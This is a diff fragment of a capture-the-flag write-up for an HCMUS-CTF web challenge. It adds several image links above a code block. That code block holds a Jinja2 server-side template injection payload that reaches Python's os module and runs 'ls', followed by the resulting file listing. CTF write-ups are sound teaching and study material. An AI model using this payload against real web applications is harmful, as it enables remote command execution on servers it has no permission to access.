@@ -10,6 +10,15 @@ I just leaked this website from HCMUS-CTF, but seem like it's under construction
 authors: Em0n
 ```
 
+![](image0.png)
+![](image1.png)
+![](image2.png)
+![](image3.png)
+![](image4.png)
+![](image5.png)
+![](image6.png)
+![](image7.png)
+
 ```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}
 __pycache__ app.py requirements.txt
